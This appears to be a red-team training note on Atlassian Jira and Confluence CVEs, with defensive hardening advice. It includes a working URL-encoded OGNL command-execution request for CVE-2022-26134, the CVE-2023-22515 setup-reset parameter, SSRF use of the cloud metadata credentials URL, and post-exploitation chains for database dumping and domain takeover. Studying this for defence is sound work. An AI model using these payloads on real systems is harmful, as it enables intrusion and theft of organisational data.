---
tags: [jira, confluence, atlassian, authentication-bypass, rce, ognl]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.27 Jira / Confluence"
---

# Jira Confluence — Authentication Bypass CVEs

## 1. Introduction

Atlassian Jira (Issue tracking and project management) and Confluence (Team workspace and wiki) are ubiquitous in corporate environments. Because they facilitate collaboration, project tracking, and documentation, they inherently store vast amounts of highly sensitive intellectual property, network diagrams, passwords, API keys, and strategic plans.

For red teamers and attackers, Atlassian products are prime targets. They are frequently exposed to the internet to allow remote work, and their complex Java-based architecture has historically suffered from critical, easily exploitable vulnerabilities—most notably unauthenticated Remote Code Execution (RCE) via OGNL (Object-Graph Navigation Language) injection and severe Authentication Bypasses.

## 2. Architecture & Vulnerability Context

Jira and Confluence are enterprise Java applications. They run on an embedded Apache Tomcat web server and utilize various Java frameworks (like WebWork or Struts historically, and Spring).

- **Plugins/Apps:** The Atlassian ecosystem relies heavily on third-party plugins. Vulnerabilities are frequently found not in the core product, but in widely installed plugins.
- **OGNL Injection:** Many critical Confluence vulnerabilities revolve around OGNL injection. OGNL is an expression language for getting and setting properties of Java objects. If user input is evaluated as an OGNL expression, an attacker can instantiate arbitrary Java classes and execute operating system commands.
- **Routing & Interceptors:** Authentication bypasses often occur due to flaws in how the application's routing framework or security interceptors parse incoming HTTP paths.

## 3. ASCII Diagram: Confluence OGNL Injection (CVE-2022-26134)

```text
      [ Attacker ]
           |
           | (1) Crafts HTTP GET request with malicious
           |     OGNL expression in the URI path
           v
  +---------------------------------------+
  |    Target Confluence Server           |
  |    Port: 8090                         |
  |                                       |
  |  GET /%24%7B%40java.lang.Runtime%40   |
  |  getRuntime%28%29.exec%28%22id%22%29  |
  |  %7D/ HTTP/1.1                        |
  +---------------------------------------+
           |
           | (2) WebWork dispatcher blindly evaluates
           |     the URI path as OGNL
           v
  +---------------------------------------+
  |    Java Runtime Environment           |
  |                                       |
  |  java.lang.Runtime.getRuntime().exec()| <-- (3) Command Execution
  +---------------------------------------+
           |
           | (4) Payload Output returned in HTTP response headers
           v
      [ Attacker ]
```

## 4. Common Misconfigurations & Reconnaissance

### Enumeration
- **Ports:** Confluence typically runs on port `8090`, Jira on port `8080`.
- **Version Detection:** Identifying the exact version is critical for mapping to known CVEs. The version is often leaked in the footer of the login page, in the page source (`<meta name="ajs-version-number" content="x.y.z">`), or in HTTP response headers.

### Information Disclosure & Anonymous Access
Administrators often configure specific spaces or Jira projects to be accessible by "Anyone" on the internet or "Any logged-in user" (which might include automatically provisioned guest accounts).
Before launching exploits, simply browse the application. Use built-in search functionality to look for "password", "VPN", "credential", or "AWS_ACCESS_KEY_ID" in anonymously accessible wikis or public Jira tickets.

## 5. Confluence Authentication Bypass & RCE CVEs

Confluence has been the target of several highly publicized, mass-exploited vulnerabilities.

### CVE-2022-26134 (Unauthenticated OGNL RCE)
A critical vulnerability where an unauthenticated attacker could execute arbitrary code by placing an OGNL expression in the URI path.
**Exploitation:**
The vulnerability occurs because a namespace property in the URI is evaluated as an OGNL expression by the XWork framework.
```http
# The payload is placed in the path. It executes 'id' and places the result in the 'X-Cmd-Response' HTTP header.
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: confluence.example.com
```

### CVE-2021-26084 (Unauthenticated OGNL RCE)
Another OGNL injection, this time occurring in the evaluation of Velocity templates. User input supplied via the `queryString` or other parameters was evaluated during the rendering of the `login.vm` template.

### CVE-2023-22515 (Broken Access Control / Privilege Escalation)
A vulnerability allowing an external attacker to exploit a zero-day flaw to create an unauthorized Confluence administrator account and access the instance.
**Mechanism:** The vulnerability involved a flaw in the `server-info.action` endpoint where an attacker could use the `bootstrapStatusProvider.applicationConfig.setupComplete=false` parameter to reset the setup state of the application, allowing them to traverse the setup wizard again and create a new admin account without affecting existing data.

## 6. Jira Authentication Bypass & SSRF

While Jira has had fewer ubiquitous RCEs than Confluence recently, it is heavily targeted for Authentication Bypasses and SSRF.

### CVE-2022-0540 (Authentication Bypass in Seraph)
Jira uses the Seraph framework for web authentication. A flaw in how Seraph parses paths allowed attackers to bypass authentication by appending specific parameters. If an attacker requested a path configured to require authentication, but appended a `;` followed by data, Seraph might misinterpret the path, while the underlying web framework (WebWork) correctly routed it, resulting in unauthenticated access to protected endpoints (especially in third-party plugins).

### SSRF Vulnerabilities
Jira often features integrations that require it to fetch external resources (e.g., fetching gadget XMLs, linking to external issue trackers). These features have historically been vulnerable to Server-Side Request Forgery.
By exploiting an SSRF in Jira, an attacker can pivot requests into the internal network, accessing metadata endpoints (if hosted on AWS/GCP) or scanning internal subnets.

## 7. Post-Exploitation

If you achieve RCE on a Confluence or Jira server:

1. **Database Access:** The application connects to a backend database (PostgreSQL, MySQL, or MS SQL). The connection string, including plaintext credentials, is located in the application's configuration files (e.g., `confluence.cfg.xml` or `dbconfig.xml`).
2. **Data Exfiltration:** With database credentials, you can dump the entire database. For Confluence, this means acquiring every document, wiki page, and attached file in the organization.
3. **Lateral Movement:** Atlassian servers are typically domain-joined (in Windows environments) or integrated with enterprise LDAP/Active Directory. A compromised Jira server is an excellent beachhead for internal network pivoting.

## 8. Defense & Hardening

1. **Keep Software Updated:** The absolute most critical defense. Atlassian CVEs are actively exploited by nation-states and ransomware operators within hours of a patch release.
2. **Do Not Expose to the Internet:** Unless absolutely necessary, Confluence and Jira should reside behind a VPN or a Zero Trust Network Access (ZTNA) solution. If public access is required, place them behind a robust Web Application Firewall (WAF) configured to block OGNL injection patterns.
3. **Run as a Restricted User:** Ensure the Java process runs under a dedicated, unprivileged service account (`jira` or `confluence`), never as `root` or `SYSTEM`. This limits the damage if an RCE occurs.
4. **Harden Database Access:** Restrict database access strictly to the IPs of the Atlassian application servers.

## 9. Chaining Opportunities

- **OGNL RCE to Active Directory Pivot:** Exploit CVE-2022-26134 to get a shell on a Windows-hosted Confluence server, extract the computer account hash or service account credentials from memory, and pass-the-hash to compromise the AD domain. Link to `[[45 - Active Directory Privilege Escalation]]` (hypothetical).
- **Jira SSRF to Cloud Takeover:** Use an SSRF vulnerability in a Jira plugin to hit the AWS Instance Metadata Service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), extract the EC2 IAM role, and use it to access the broader AWS environment. Link to `[[05 - Server-Side Request Forgery (SSRF)]]`.

## 10. Related Notes

- `[[12 - Command Injection]]`
- `[[05 - Server-Side Request Forgery (SSRF)]]`
- `[[06 - Insecure Deserialization]]` (Related to complex Java framework vulnerabilities)
